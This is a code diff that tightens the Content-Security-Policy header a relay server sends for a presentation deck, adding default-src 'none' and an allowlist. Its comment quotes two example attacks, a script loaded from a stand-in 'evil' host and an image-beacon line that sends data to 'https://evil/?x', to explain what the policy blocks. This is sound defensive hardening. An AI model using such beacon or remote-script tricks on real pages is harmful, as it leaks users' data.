@@ -328,7 +328,14 @@ export function createRelay(opts: RelayOptions): RelayServer {
             // iframe/Permissions-Policy feature) — browsers reject it and log a
             // console error. Fullscreen for this top-level doc is governed by the
             // Fullscreen API / Permissions-Policy, not the sandbox directive.
-            "content-security-policy": `sandbox allow-scripts allow-popups; connect-src ${ws} ${http}`,
+            //
+            // `default-src 'none'` + a single-file allowlist (ADR 0069): a deck
+            // inlines all assets (ADR 0001), so it needs zero external origins —
+            // this blocks remote code (`<script src=evil>`) and GET-beacon exfil
+            // (`new Image().src='https://evil/?x'`) that `connect-src` can't pin.
+            // Mirrors the dashboard's static-share CSP, but keeps `connect-src`
+            // to our sync socket and `allow-popups` for the presenter pop-out.
+            "content-security-policy": `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src ${ws} ${http}; frame-ancestors 'none'; sandbox allow-scripts allow-popups`,
             "x-content-type-options": "nosniff",
             "referrer-policy": "no-referrer",
           },
